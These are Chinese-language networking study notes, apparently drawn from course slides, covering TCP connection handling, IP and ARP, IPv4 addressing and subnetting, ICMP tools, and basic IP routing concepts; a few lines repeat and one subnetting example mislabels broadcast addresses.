Checksum:覆盖UDP头部和UDP数据的校验和，长度为16比特 端口号 TCP的建立-三次握手 ▫由TCP连接发起方（图中PC1），发送第一个SYN位置1的TCP报文。初始序列号a为一 个随机生成的数字，因为没收到过来自PC2的任何报文，所以确认序列号为0 ； ▫ 接收方（图中PC2）接收到合法的SYN报文之后，回复一个SYN和ACK置1的TCP报文。 初始序列号b为一个随机生成的数字，同时因为此报文是回复给PC1的报文，所以确 认序列号为a+1； ▫ PC1接收到PC2发送的SYN和ACK置位的TCP报文后，回复一个ACK置位的报文，此时 序列号为a+1,确认序列号为b+1。PC2收到之后，TCP双向连接建立 TCP的序列号与确认序列号： TCP使用序列号和确认序列号字段实现数据的可靠和有序传输。 • 假设PC1要给PC2发送一段数据，传输过程如下： ​ ▫ 1. PC1将全部待TCP发送的数据按照字节为单位编上号。假设第一个字节的编号为 “a+1”，第二个字节的序号为“a+2”，依次类推。 ​ ▫ 2. PC1会把每一段数据的第一个字节的编号作为序列号（Sequence number），然后将TCP报文发送出去。 ​ ▫ 3. PC2在收到PC1发送来的TCP报文后，需要给予确认同时请求下一段数据，如何确 定下一段数据呢？序列号( a+1 )+载荷长度=下一段数据的第一个字节的序号 （a+1+12） ​ ▫ 4. PC1在收到PC2发送的TCP报文之后，发现确认序列号为“a+1+12” ，说明“a+1” 到“a+12”这一段的数据已经被接受，需要从“a+1+12”开始发送。 • 为了提升发送效率，也可以一次性发送多段数据，由接收方统一确认。 TCP的窗口滑动机制 • 1. 在TCP三次握手建立连接时，双方都会通过Window字段告诉对方本端最大能够接受的字 节数（也就是缓冲区大小）。 • 2. 连接建立成功之后，发送方会根据接受方宣告的Window大小发送相应字节数的数据。 • 3. 接受方接受到数据之后会放在缓冲区内，等待上层应用来取走缓冲的数据。若数据被上 层取走，则相应的缓冲空间将被释放。 • 4. 接收方根据自身的缓存空间大小通告当前的可以接受的数据大小( Window )。 • 5. 发送方根据接收方当前的Window大小发送相应数量的数据 TCP的关闭-四次挥手 ▫ 1. 由PC1发出一个FIN字段置”1 ”的不带数据的TCP段； ▫ 2. PC2收到PC1发来的FIN置位的TCP报文后，会回复一个ACK置位的TCP报文。 ▫ 3. 若PC2也没有需要发送的数据，则直接发送FIN置位的TCP报文。假设此时PC2还有 数据要发送，那么当PC2发送完这些数据之后会发送一个FIN置位的TCP报文去关闭连 接。 ▫ 4. PC1收到FIN置位的TCP报文，回复ACK报文，TCP双向连接断开 网络层传输层负责建立主机之间进程与进程之间的连接，而网络层则负责数据从一台主机到另一台主机之间的传递。 网络层的PDU被称为包 网络层协议工作过程 当采用IP作为网络层协议时，通信的双方都会被分配到一个“独一无二”的IP地址来标识自 己。IP地址可被写成32位的二进制整数值形式，但为了方便人们阅读和分析，它通常被写 成点分十进制的形式，即四个字节被分开用十进制表示，中间用点分隔，比如192.168.1.1。 IP数据包的封装与转发： 网络层收到上层（如传输层）协议传来的数据时候，会封装一个IP报文头部，并且把 源和目的IP地址都添加到该头部中。 中间经过的网络设备（如路由器），会维护一张指导IP报文转发的“地图”——路由 表，通过读取IP数据包的目的地址，查找本地路由表后转发IP数据包。 IP数据包最终到达目的主机，目的主机通过读取目的IP地址确定是否接受并做下一步 处理。 IP协议工作时，需要如OSPF、IS-IS、BGP等各种路由协议帮助路由器建立路由表，ICMP帮 忙进行网络的控制和状态诊断。 数据链路层数据链路层位于网络层和物理层之间，可以向网络层的IP、IPV6等协议提供服务，数据链路层的PDU被称为Frame（帧）。 以太网与MAC地址以太网：是一种支持多点接入的广播式数据链路层协议。个人电脑的网络接口遵循的就是以太网标准。一般情况下，一个广播域对应一个IP网段。 以太网MAC地址：MAC地址在网络中唯一标识一个网卡，每个网卡都需要且会有唯一的一个MAC地址，MAC地址用于在一个IP网段内，寻址找到具体的物理设备。工作在数据链路层的设备，例如以太网交换机，会维护一张MAC地址表，用于指导数据帧转发。MAC地址由48比特（6个字节）长，12位的16进制数字组成。例如：48-A4-72-1C-8F-4F 地址解析协议（ARP)ARP（Address Resolution Protocol，地址解析协议）是根据IP地址获取数据链路层地址的 一个TCP/IP协议。 ARP是IPv4中必不可少的一种协议，它的主要功能是： 将IP地址解析为MAC地址； 维护IP地址与MAC地址的映射关系的缓存，即ARP表项； 实现网段内重复IP地址的检测。 ARP的工作原理 网络设备一般都有一个ARP缓存（ARP Cache）。ARP缓存用来存放IP地址和MAC地址的关联信息。 在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的ARP表项，则直接 采用该表项中的MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应信息， 则通过发送ARP Request报文来获得它。 学习到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期内 （缺省：180s），设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进 行ARP查询。过了这段有效期，ARP表项会被自动删除。 如果目标设备位于其他网络，则源设备会在ARP缓存表中查找网关的MAC地址。然后将数 据发送给网关。最后网关再把数据转发给目的设备 主机1的ARP缓存表中不存在主机2的MAC地址，所以主机1会发送ARP Request来获取目的 MAC地址。 ARP Request报文封装在以太帧里。帧头中的源MAC地址为发送端主机1的MAC地址。此时， 由于主机1不知道主机2的MAC地址，所以目的MAC地址为广播地址FF-FF-FF-FF-FF-FF。 ARP Request报文中包含发送端MAC地址、发送端IP地址、目的端MAC地址、目的端IP地 址，其中目的端MAC地址的值为0。ARP Request报文会在整个网络上传播，该网络中所有 主机包括网关都会接收到此ARP Request报文。 若不匹配则不会响应，若匹配则则该主机会 将ARP请求报文中的发送端MAC地址和发送端IP地址信息记录到自己的ARP缓存表中，然后 通过ARP Reply报文进行响应 主机2会向主机1回应ARP Reply报文。 ARP Reply报文中的发送端IP地址是主机2自己的IP地址，目的端IP地址是主机1的IP地址， 目的端MAC地址是主机1的MAC地址，发送端MAC地址是自己的MAC地址，同时操作类型 被设置为Reply。 ARP Reply报文通过单播传送 物理层数据到达物理层之后，物理层会根据物理介质的不同，将数字信号转换为光信号、电信号或者是电磁波信号 物理层的PDU被称为比特流 常见传输介质 双绞线：当今以太网最常见的传输介质，按照抗电磁干扰能力还可以分为： STP-屏蔽双绞线和UTP-非屏蔽双绞线 光纤传输，按照功能部件可分为： 光纤传输，按照功能部件可分为： 光模块：将电信号与光信号互转的器件，产生光信号。 串口电缆在WAN（Wide Area Network，广域网）中大规模使用，根据WAN线路类型不同， 串口电缆在设备上连接的接口类型也不同：异/同步串口、ATM接口、POS接口、CE1/PRI 接口等。 无线信号的传输可以通过电磁波进行，例如：无线路由器将数据通过调制以电磁波发送出 去，移动终端的无线网卡将电磁波解调，得到数据，完成从无线路由器到移动终端的数据 传输。 数据通信过程发送方数据封装-&gt;中间网络数据传输-&gt;接收方数据解封装 发送方数据封装 中间网络数据传输封装好的完整数据，会在网络中被传递 一般情况下： 网络中的二层设备（如以太网交换机）只会解封装数据的二层头部，根据二层头部的 信息进行相应的“交换”操作。 网络中的三层设备（如路由器）只会解封装到三层头部，并且根据三层头部的信息进 行相应的“路由”操作。 接收方数据解封装 经过中间网络传递之后，数据最终到达目的服务器。根据不同的协议头部的信息，数据将 被一层层的解封装并做相应的处理和传递，最终交由WEB服务器上的应用程序进行处理。 分层模型的概念的优势 各个层次之间分工、界限明确，有助于各个部件的开发、设计和故障排除。 通过定义在模型的每一层实现什么功能,鼓励产业的标准化。 通过提供接口的方式，使得各种类型的网络硬件和软件能够相互通信，提高兼容性。 网络层协议及IP编址网络层协议网络层协议包括IP协议，ICMP协议，IPX协议等 IP协议ip是Internet Protocol的缩写。Internet Protocol本身是一个协议文件的名称，该协议文件的内容非常少，主要是定义并阐述了IP报文的格式 经常被提及的IP，一般不是特指Internet Protocol这个协议本身，而是泛指直接或间接与IP协议相关的任何内容。 作用：为网络层的设备提供逻辑地址，负责数据包的寻址和转发。 IPv4（Internet Protocol Version 4）协议族是TCP/IP协议族中最为核心的协议族。它工作在TCP/IP协议栈的网络层，该层与OSI参考模型的网络层相对应。 IPv6（Internet Protocol Version 6）是网络层协议的第二代标准协议，也被称为IPng （IP Next Generation）。它是Internet工程任务组IETF（Internet Engineering Task Force）设计的一套规范，是IPv4（Internet Protocol Version 4）的升级版本。 数据封装 应用数据需要经过TCP/IP每一层处理之后才能通过网络传输到目的端，每一层上都使用该 层的协议数据单元PDU（Protocol Data Unit）彼此交换信息。 如上层数据在传输层添加TCP报头后得到的PDU被称为Segment（数据段）；数据段被传递给网络层，网络层添加IP报头得到的PDU被称为Packet（数据包）；数据包被传递到数据链路层，封装数据链路层报头和尾部得到的PDU被称为Frame（数据帧）； 最后，帧被转换为比特，通过网络介质传输。 IPV4报文格式 Version：4 bit，4：表示为IPv4；6：表示为IPv6。 Header Length：4 bit，首部长度，如果不带Option字段，则为20，最长为60。 Type of Service：8 bit，服务类型。只有在有QoS差分服务要求时，这个字段才起作用 Total Length：16 bit，总长度，整个IP数据包的长度。 Identification：16 bit，标识，分片重组时会用到该字段。 Flags：3 bit，标志位。 保留段位：0，保留。 不分段位：1，表示“不能分片”；0，表示“能分片”。 更多段位：1，表示“后面还有分片”；0，表示“最后一个数据片”。 Fragment Offset：12 bit，片偏移，分片重组时会用到该字段。指出较长的分组在分片后， 该片在原分组中的相对位置，与更多段位组合，帮助接收方组合分段的报文。 Time to Live：8 bit，生存时间。可经过的最多路由数，即数据包在网络中可通过的路由器数的最大值。 Protocol：8 bit，协议：下一层协议。指出此数据包携带的数据使用何种协议，以便目的主机的IP层将数据部分上交给哪个进程处理。 1: ICMP, Internet Control Message； 2: IGMP, Internet Group Management； 6: TCP , Transmission Control Protocol； 17: UDP, User Datagram Protocol。 Header Checksum：16 bit，首部检验和。 Source IP Address：32 bit，源IP地址。 Destination IP Address：32 bit，目的IP地址。 Options：可变，选项字段。 Padding：可变，填充字段，全填0 数据包分片将报文分割成多个片段的过程叫分片 网络中转发的ip报文的长度可以不同，但若报文长度超过了数据链路所支持的最大长度，则报文就要分割成若干个较小的片段才能在链路上传输 与IP数据包包头中的Identification，Flags，Fragment Offset三部分内容有关 生存时间（Time to Live,TTL)TTL字段设置了数据包可以经过的路由器数目，一旦经过一个路由器，TTL值减一，当为0时，数据包被丢弃 报文在网段间转发时，如果网络设备上的路由规划不合理，就可能会出现环路，导致报文在网络中无限循环，无法到达目的端。环路发生后，所有发往这个目的地的报文都会被循环转发，随着这种报文逐渐增多，网络将会发生拥塞。 为避免环路导致的网络拥塞，IP报文头中包含一个生存时间TTL（Time To Live）字段。 报文每经过一台三层设备，TTL值减1。初始TTL值由源端设备设置。当报文中的TTL 降为0时，报文会被丢弃。同时，丢弃报文的设备会根据报文头中的源IP地址向源端 发送ICMP错误消息。（注意：网络设备也可被配置为不向源端发送ICMP错误消息。） 协议号目的端的网络层在接收并处理报文以后，需要决定下一步对报文如何处理。IP报文头中的协 议字段标识了将会继续处理报文的协议。 该字段可以标识网络层协议，如ICMP（Internet Control Message Protocol，因特网控制 报文协议，对应值0x01）；也可以标识上层协议，如TCP（Transmission Control Protocol， 传输控制协议，对应值0x06）、UDP（User Datagram Protocol，用户数据包协议，对应 值0x11） IPV4地址介绍IP地址是网络中用于标识一个节点（或者网络设备的接口） ip地址用于ip报文在网络中的寻址 在IP网络上，如果用户要将一台计算机连接到Internet上，就需要申请一个IP地址。IP地址 就像现实中的地址，可以标识网络中的一个节点，数据就是通过它来找到目的地的。即我 们通过IP地址实现全球范围内的网络通信。 IP地址是网络设备接口的属性，不是网络设备本身的属性。当我们说给某台设备分配一个IP 地址时，实质上是指给这台设备的某个接口分配一个IP地址。如果设备有多个接口，通常每 个接口都至少需要一个IP地址。 IPV4地址的表示P地址是长度是32 bit，由4个字节组成。为了阅读和书写方便，IP地址通常采用点分 十进制数来表示。 IPV4地址通常采用点分十进制表示 IPV4地址范围00000000.00000000.00000000.0000000011111111.11111111.11111111.1111111 1，即0.0.0.0255.255.255.255 IPV4地址构成网络部分（网络号）：用于标识一个网络 IP地址不能反映任何有关主机位置的地理信息，只能通过网络号码字段判断出 主机属于哪个网络。 对于网络号相同的设备，无论实际所处的物理位置如何，它们都是处在同一个 网络中。 主机部分（主机号）：用来区分一个网络内的不同主机 网络掩码（子网掩码）：区分一个ip地址中的网络部分和主机部分 网络掩码为32 bit，与IP地址的位数一样，通常也以点分十进制数来表示。 网络掩码不是一个IP地址，在二进制的表示上是一堆连续的1、后面接一堆连续的0。 通常将网络掩码中1的个数称为这个网络掩码的长度。如：掩码0.0.0.0的长度是0，掩 码252.0.0.0的长度是6。 网络掩码一般与IP地址结合使用，其中值为1的比特对应IP地址中的网络位；值为0的 比特对应IP地址中的主机位，以此来辅助我们识别一个IP地址中的网络位与主机位。 即网络掩码中1的个数就是IP地址的网络号的位数，0的个数就是IP地址的主机号的位 数 IP地址寻址网络号用于表示主机所在的网络，，类似于“XX省XX市XX区XX小区”的作用。 主机号用于表示网络号所定义的网络范围内某个特定的主机接口，类似于门牌号“XX栋XX 号”的作用。 网络寻址： 二层网络寻址：可直接通过IP地址，找到对应的主机接口。 三层网络寻址：利用网关转发来自不同网段之间的数据包。 网关： 报文转发过程中，首先需要确定转发路径以及通往目的网段的接口。如果目的主机与 源主机不在同一网段，报文需要先转发到网关，然后通过网关将报文转发到目的网段。 网关是指接收并处理本地网段主机发送的报文并转发到目的网段的设备。为实现此功能，网关必须知道目的网段的路由。网关设备上连接本地网段的接口地址即为该网段 的网关地址。 IP地址分类（有类编址） A、B、C、D、E类的类别字段分别是二进制数0、10、110、1110、1111，通过网络 号码字段的前几个比特就可以判断IP地址属于哪一类，这是区分各类地址最简单的方 法。 A、B、C三类地址是单播IP地址 (除一些特殊地址外)，只有这三类地址才能分配给主 机接口使用。 D类地址属于组播IP地址。 E类地址专门用于特殊的实验目的。 A,B,C类地址比较 使用A类地址的网络称为A类网络；使用B类地址的网络称为B类网络；使用C类地址的 网络称为C类网络。 使用A类地址的网络称为A类网络；使用B类地址的网络称为B类网络；使用C类地址的 网络称为C类网络。 B类网络的网络号为16 bit，介于A类和C类网络之间；首两位恒定为10，地址空间为： 128.0.0.0~191.255.255.255。 C类网络的网络号为24 bit，个数很多，但所允许的主机接口的个数就很少；首三位恒 定为110，地址空间为：192.0.0.0~223.255.255.255。 组播地址：组播能实现一对多传递消息。 IP地址类型网段：一个网络号所定义的网络范围 网络地址：用于标识一个网络 网络号为X，主机号的每个比特都为0。 不能分配给具体的主机接口使用。 广播地址：用于向该网络中的所有主机发送数据的特殊地址 网络号为X，主机号的每个比特都为1。 不能分配给具体的主机接口使用。 可用地址：又称主机地址，可用分配给具体的主机接口使用。 一个网段的主机位为n位，则IP地址数为：2ⁿ，可用IP地址数为：2ⁿ-2 (减去网络地址 和广播地址)。 私网IP地址公网IP地址：由IANA统一分配，以保证任何一个IP地址在Internet上的唯一性，这里的IP地址是指公网IP地址。 私网IP地址：私网IP地址的使用使得网络可以得到更为自由地扩展，因为同一个私网 IP地址是可以在不同的私有网络中重复使用的。在IP地址空间中，A,B,C三类地址各预留了一些地址专门用于私网IP地址 私有网络连接到Internet：私有网络由于使用了私网IP地址，是不允许连接到Internet的。 后来在实际需求的驱动下，许多私有网络也希望能够连接到Internet上，从而实现私网与 Internet之间的通信，以及通过Internet实现私网与私网之间的通信。私网与Internet的互联， 必须使用网络地址转换 (NAT)技术实现。 NAT (Network Address Translation)，网络地址转换，其基本作用是实现私网IP地址 与公网IP地址之间的转换。 特殊IP地址255.255.255.255：可作为目的地址发往网段所有主机（受限于网关） 这个地址称为有限广播地址，它可以作为一个IP报文的目的IP地址使用。 路由器接收到目的IP地址为有限广播地址的IP报文后，会停止对该IP报文的转发。 0.0.0.0： 如果把这个地址作为网络地址，它的意思就是“任何网络”的网络地址；如果把这个 地址作为主机接口地址，它的意思就是“这个网络上主机接口”的IP地址。 如果把这个地址作为网络地址，它的意思就是“任何网络”的网络地址；如果把这个 地址作为主机接口地址，它的意思就是“这个网络上主机接口”的IP地址。 127.0.0.1/8： 这个地址为环回地址，它可以作为一个IP报文的目的IP地址使用。其作用是测试设备 自身的软件系统。 一个设备产生的、目的IP地址为环回地址的IP报文是不可能离开这个设备本身的 169.254.0.0/16： 如果一个网络设备获取IP地址的方式被设置成了自动获取方式，但是该设备在网络上又没有找到可用的DHCP（动态主机配置协议，用于动态分配网络配置参数，如IP地址）服务器，那么该设备就会使用169.254.0.0/16网段的某个地 址来进行临时通信。 IPV4与IPV6 子网划分“有类编址”的地址划分过于死板，划分的颗粒度太大，会有大量的主机号不能被充分利 用，从而造成了大量的IP地址资源浪费。因此可以利用子网划分来减少地址浪费，即VLSM (Variable Length Subnet Mask)，可变 长子网掩码。将一个大的有类网络，划分成若干个小的子网，使得IP地址的使用更为科学。 如何进行子网划分原网段分析假设有一个C类网段地址：192.168.10.0；默认情况下，网络掩码为24位，包括24位网络位， 8位主机位。通过计算可知，这样的网络中，有256个IP地址（2的8次方）。 向主机借位，形成子网现在，将原有的24位网络位向主机位去“借”1位，这样网络位就扩充到了25位，相对的主 机位就减少到了7位，而借过来的这1位就是子网位，此时网络掩码就变成了25位，即 255.255.255.128，或/25。 子网位：可取值0或取值1，则得到了两个新的子网。 通过计算可知，现在网络中，有128个IP地址 计算子网网络地址计算网络地址，主机位全为0： 计算网络地址，主机位全为0： 如果子网位取值1，则网络地址为192.168.10.128/25 计算子网广播地址计算广播地址，主机位全为1： 如果子网位取值0，则网络地址为192.168.10.127/25。 如果子网位取值1，则网络地址为192.168.10.255/25。 ICMP协议是IP协议的辅助协议，用来在网络设备间传递各种差错和控制信息，对于收集各种网络信息、诊断和排除各种网络故障等方面起着至关重要的作用。 为了更有效地转发IP数据报文和提高数据报文交互成功的机会，在网络层使用ICMP协议。 ICMP允许主机或设备报告差错情况和提供有关异常情况的报告。 ICMP消息： ICMP消息封装在IP报文中，IP报文头部Protocol值为1时表示ICMP协议。 字段解释： ICMP消息的格式取决于Type和Code字段，其中Type字段为消息类型，Code字 段包含该消息类型的具体参数。 校验和字段用于检查消息是否完整。 消息中包含32 bit的可变参数，这个字段一般不使用，通常设置为0。 在ICMP重定向消息中，这个字段用来指定网关IP地址，主机根据这个地 址将报文重定向到指定网关。 在Echo请求消息中，这个字段包含标识符和序号，源端根据这两个参数 将收到的回复消息与本端发送的Echo请求消息进行关联。尤其是当源端 向目的端发送了多个Echo请求消息时，需要根据标识符和序号将Echo请 求和回复消息进行一一对应 ICMP重定向ICMP重定向报文是ICMP控制报文中的一种。在特定的情况下，当路由器检测到一台机器使用非最优路由的时候，它会向该主机发送一个ICMP重定向报文，请求主机改变路由 过程： 主机A希望发送报文到服务器A，于是根据配置的默认网关地址向网关RTB发送报文。 网关RTB收到报文后，检查报文信息，发现报文应该转发到与源主机在同一网段的另 一个网关设备RTA，此转发路径是更优的路径，所以RTB会向主机发送一个Redirect 消息，通知主机直接向另一个网关RTA发送该报文。 主机收到Redirect消息后，会向RTA发送报文，然后RTA会将该报文再转发给服务器 A ICMP差错检测ICMP Echo消息常用于诊断源和目的地之间的网络连通性，同时还可以提供其他信息，如报文往返时间等 ICMP的一个典型应用是Ping。Ping是检测网络连通性的常用工具，同时也能够收集其他相 关信息。用户可以在Ping命令中指定不同参数，如ICMP报文长度、发送的ICMP报文个数、 等待回复响应的超时时间等，设备根据配置的参数来构造并发送ICMP报文，进行Ping测试。ping常用于探测到达目的节点的网络可达性 ICMP错误报告ICMP定义了各种错误消息，用于诊断网络连接性问题；根据这些错误消息，源设备可以判 断出数据传输失败的原因。 如果网络中发生了环路，导致报文在网络中循环，且最终TTL超时，这种情况下网络 设备会发送TTL超时消息给发送端设备。 如果目的地不可达，则中间的网络设备会发送目的不可达消息给发送端设备。目的不 可达的情况有多种，如果是网络设备无法找到目的网络，则发送目的网络不可达消息； 如果网络设备无法找到目的网络中的目的主机，则发送目的主机不可达消息。 ICMP的另一个典型应用是Tracert。Tracert基于报文头中的TTL值来逐跳跟踪报文的转发路径。为了跟踪到达某特定目的地址的路径，源端首先将报文的TTL值设置为1。该报文到达第一个节点后，TTL超时，于是该节点向源端发送TTL超时消息，消息中携带时间戳。然后 源端将报文的TTL值设置为2，报文到达第二个节点后超时，该节点同样返回TTL超时消息， 以此类推，直到报文到达目的地。这样，源端根据返回的报文中的信息可以跟踪到报文经 过的每一个节点，并根据时间戳信息计算往返时间。Tracert是检测网络丢包和时延的有效手段，同时可以帮助管理源发现网络中的路由环路 IPV4地址配置及基本应用IP地址的基础配置命令进入接口视图： interface interface-type interface-number *interface-type interface-number:*指定接口类型和接口编号。接口类型和接口编号之间可以输入空格也可以不输 配置接口的IP地址 ip address ip-address&#123;mask|mask-length&#125; 在接口视图下，通过此命令来给网络设备上的接口配置ip地址，实现网络的互连。 ip-address：指定接口的ip地址，点分十进制形式 mask：指定子网掩码，点分十进制形式 mask-length：指定掩码长度，整数形式，取值范围是0-32. 案例：配置接口ip地址 物理接口：物理接口是指网络设备上实际存在的接口，分为负责承担业务传输的业务接口 和负责管理设备的管理接口，例如GE业务接口和MEth管理接口。 逻辑接口：逻辑接口是指能够实现数据交换功能但物理上不存在、需要通过配置建立的接 口，需要承担业务传输，例如VLANIF接口、Loopback接口。 Loopback接口：用户需要一个接口状态永远是Up的接口的IP地址时，可以选择 Loopback接口的IP地址。 Loopback接口：用户需要一个接口状态永远是Up的接口的IP地址时，可以选择 Loopback接口的IP地址。 Loopback接口配置IP地址后，就可以对外发布。Loopback接口上可以配置32位 掩码的IP地址，达到节省地址空间的目的。 Loopback接口不能封装任何链路层协议，数据链路层也就不存在协商问题，其 协议状态永远都是Up。 对于目的地址不是本地IP地址，出接口是本地Loopback接口的报文，设备会将 其直接丢弃。 网络IP地址规划规划目标：易管理、易扩展、利用率高。 规划原则： 唯一性：一个IP网络中不能有两个主机采用相同的IP地址。 连续性：连续地址在层次结构网络中易于进行路由汇总，大大缩减路由表，提高路由 计算的效率、加速路由收敛。 扩展性：地址分配在每一层次上都要有合理的预留，在网络规模扩展时能保证路由汇 总所需的连续性。避免网络扩展造成的地址、路由重新规划。 结构化、业务相关性：地址规划与网络拓扑结构和网络承载业务结合起来，便于路由 规划和QoS部署。好的IP地址规划使得每个地址都具有实际含义，看到一个地址就可 以大致判断出该地址所属的设备和对应的业务。 IP路由基础路由概述 当路由器从多种不同的途径获知到达同一个目的网段的路由(这些路由的目的网络地址及网络掩码均相同)时，会优先路由优先级值最小的路由；如果这些路由学习自相同的路由协议，则优选度量值最优的。总之，最优的路由加入路由表 当路由器收到一个数据包时，会在自己的路由表里查询数据包的目的IP地址，如果能够找到匹配的路由表项，则依据表项所指示的出接口及下一跳来转发数据；如果没有匹配的表现则丢弃该数据包 路由器的行为是逐级跳的，数据包从源到目的地沿路径每个路由器都必须有关于目标网段的路由，否则就会造成丢包 数据通信往往是双向的，因此要关注流量的往返(往返路由) 路由基本概念通过IP地址能够寻找到一个唯一的网络节点，每个IP都有自己所属的网段，这些网络可能分 布在世界各地，共同组成了全球的网络。 为了实现不同网段之间的相互通信，网络设备需要能够转发来自不同网段的IP报文，将其送 达不同的IP网段 路由 路由是指导报文转发的路径信息，通过路由可以确认转发IP报文的路径 路由设备是依据路由转发报文到目的网段的网络设备，最常见的路由设备：路由器 路由设备维护着一张路由表，保存着路由信息 网关以及中间节点（路由器）根据收到的IP报文其目的地址选择一条合适的路径，并将报文 转发到下一个路由器。在路径中的最后一跳路由器二层寻址将报文转发给目的主机。这个 过程被称为路由转发。 中间节点选择路径所依赖的表项为称为路由表。 路由条目包含明确的出接口以及下一跳，这两项信息指导IP报文转发到相应的下一跳设备上 路由信息 目的网络：标识目的网段 掩码：与目的地址共同标识一个网段 出接口：数据包被路由后离开本路由的接口 下一跳：路由器转发到达目的网段的数据包所使用的下一跳地址 这些信息标识了目的网段、明确了转发ip报文的路径 通过路由中包含的信息，路由设备可以转发IP报文到相应的路径。 目的地址、掩码用于识别IP报文目的地址，路由设备将IP报文匹配到相应的路由之后，根据 路由的出接口、下一跳确认转发的路径。 只有出接口并不能够确认转发IP报文的下一跳设备，还需要明确的下一跳设备地址。 路由表 路由器通过各种方式发现路由 路由器选择最优的路由条目放入路由表中 路由器指导设备对ip报文的转发 路由器通过对路由表的管理实现对路径的信息管理 路由器依据路由表转发报文。 路由表由一条条详细的路由条目组成。 路由表由路由条目组成，但不代表路由表中保存了所有路由，路由表中只会保存“最优的” 路由。 对路由表中的路由条目的管理实际上就是路由器维护、管理路由信息的具体实现 路由条目生成路由信息获取方式 路由器依据路由表进行路由转发，为实现路由转发，路由器需要发现路由。常见的有直连路由、静态路由和动态路由 直连接口所在网段的路由，由设备自动生成。 直连接口所在网段的路由，由设备自动生成。 动态路由：路由器通过动态路由协议（如OSPF、IS-IS、BGP等）学习到的路由 直连路由 直连路由指向本地直连网络的路由，由设备自动生成 当路由器为路由转发的最后一跳路由器时，IP报文匹配直连路由，路由器转发IP报文到目的主机 使用直连路由进行路由转发时，报文的目的IP和路由器接口IP在一个网段内 当匹配中直连路由进行转发时，此时路由器会查看ARP表项，将报文直接转到目的地址，此 时该路由器为路由转发的最后一跳路由器。 直连路由的下一跳地址并不是其他设备上的接口地址，因为该路由的目的网段为接口所在 网段，本接口就是最后一跳，不需要再转发给下一跳，所以在路由表中的下一跳地址就是 接口自身地址。 使用直连路由进行路由转发时，转发的动作不是交给下一跳，而是查询ARP表项，根据ARP 表项封装报文，将报文发送到目的IP。 并不是所有接口生成的直连路由都会出现在路由表中，直连路由出现在路由表中的前提是该接口的物理状态、协议状态都为up 最优路由条目优选ip路由表： Preference用于不同路由协议间路由优先级的比较，Cost用于同一种路由协议内部不同路由的优先级的比较。在业界，Cost也被称为路由度量值（Metric）。 路由优先级 - 常见默认值 优先级值（Preference）越小代表加入路由表的优先级越高 拥有最高优先级的路由将被添加进路由表 度量值 (cost)- 基本概念 当路由器通过某种协议发现了多条到达同一个目的网络的路由时(拥有相同的路由优先级)，度量值将作为路由优选的依据之一。 路由度量值表示到达这条路由所指目的地址的代价。 一些常用的度量值有：跳数、带宽、时延、代价、负载、可靠性等 度量数值越小越优先，度量值最小路由将会被添加到路由表中 路由转发最长匹配原则当路由器收到一个IP数据包时，会将数据包的目的IP地址与自己本地路由表中的所有路由表项进行逐位比对，直到找到匹配度最长的条目，这就是最长前缀匹配机制。 示例： 路由转发流程 来自10.0.1.0/24网段的IP报文想要去往40.0.1.0/24网段，首先到达网关，网关查找路由表项， 确定转发的下一跳、出接口，之后报文转发给R2。报文到达R2之后，R2通过查找路由表项转发给R3，R3收到后查找路由表项，发现IP报文目的IP属于本地接口所在网段，直接本地转发。 静态路由应用场景静态路由由网络管理员手动配置，配置方便，对系统要求低，适用于拓扑结构简单并且稳定的小型网络 缺点是不能自动适应网络拓扑的变化，需要人工干预。 配置 缺省路由缺省路由是一种特殊的路由，当报文没有在路由表中找到匹配的具体路由表项时才使用的路由。如果报文的目的地址不能与路由表的任何目的地址相匹配，那么该报文将选取缺省路由进行转发 缺省路由在路由表中的形式为0.0.0.0/0，缺省路由也叫做默认路由 缺省路由一般用于企业网络出口，配置一条缺省路由让出口设备能够转发前往internet上任意地址的ip报文。 动态路由当网络规模越来越大时，使用手动配置静态路由的方式获取路由条目将变得越发复杂，同时在拓扑发生变化时不能及时、灵活响应 动态路由协议有自己的路由算法，能够自动适应网络拓扑的变化，可以有效减少管理人员的工作量，适用于具有一定数量三层设备的网络。 分类根据路由信息传递的内容、计算路由的算法，可以将动态路由协议分为两大类 距离矢量协议（Distance-Vector Protocol） RIP 链路状态协议（Link-State Protocol） OSPF IS-IS BGP使用一种基于距离矢量算法修改后的算法，该算法被称为路径矢量（Path Vector） 算法。因此在某些场合下，BGP也被称为路径矢量路由协议。 根据工作范围不同，又可以分为 内部网关协议IGP（Interior Gateway Protocol）:在一个自治系统内部运行。RIP、 OSPF、ISIS为常见的IGP协议。 外部网关协议EGP（Exterior Gateway Protocol）：运行于不同自治系统之间。BGP 是目前最常用的EGP协议。 路由高级特性路由递归路由必须有直连的下一跳才能够指导转发，但是路由生成时下一跳可能不是直连的，因此需要计算出一个直连的下一跳和对应的出接口，这个过程叫做路由递归，也被称为路由迭代。 等价路由路由表中存在等价路由之后，前往该目的网段的IP报文路由器会通过所有有效的接口、下一跳转发，这种转发行为被称为负载分担 浮动路由静态路由支持配置时手动指定优先级，可以通过配置目的地址/掩码相同、优先级不同、下一跳不同的静态路由，实现转发路径的备份。 浮动路由是主用路由的备份，保证链路故障时提供备份路由。主用路由下一跳可达时该备份路由不会出现在路由表中 示例 RTA-RTB之间的链路正常时，20.0.0.0/30的两条路由条目都是有效的条目，此时比较优先 级，下一跳为10.1.1.2的优先级60，下一跳为10.1.2.2的优先级70，因此下一跳为10.1.1.2的 加入路由表。 RTA-RTB之间的链路故障时，10.1.1.2不可达，因此下一跳为10.1.1.2的路由失效，此时前 往20.0.0.0/30的路由就只存在一条，该条路由将会被选入路由表。前往20.0.0.1的流量将会 被转发到10.1.2.2 路由汇总CIDR(无类别域间路由)采用ip地址加掩码长度来标识网络和子网，而不是按照穿透的A、B、C等类型对网络地址进行划分 CIDR容许任意长度的掩码长度，将ip地址看出连续的地址空间，可以使用任意长度的前缀分配，多个连续的前缀可以聚合成一个网络，该特性可以有效减少路由表条目数量 路由汇总需求子网划分、VLSM解决了地址空间浪费的问题，但同时也带来了新的问题：路由表中的路由条目数量增加。 为减少路由条目数量可以使用路由汇总 